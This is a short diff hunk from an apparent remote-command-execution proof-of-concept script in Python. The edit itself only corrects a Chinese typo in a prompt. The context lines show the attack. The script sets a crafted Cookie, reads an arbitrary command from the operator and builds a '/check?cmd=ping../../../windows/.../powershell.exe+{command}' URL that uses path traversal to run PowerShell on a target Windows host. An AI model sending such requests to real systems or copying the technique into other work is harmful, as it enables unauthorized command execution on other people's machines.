@@ -115,7 +115,7 @@ def _verify(urls):
 					"Accept-Language": "zh-CN,zh;q=0.9",
 					"Cookie": "CID =" + verify_string
 				}
-				command = str(input("[+] 请输出需要执行的命令："))
+				command = str(input("[+] 请输入需要执行的命令："))
 				if len(command) > 1 and "exit" not in command:
 					poc2 = 'http://' + urls + f'/check?cmd=ping../../../windows/system32/windowspowershell/v1.0/powershell.exe+{command}'
 					# print(verify_string)
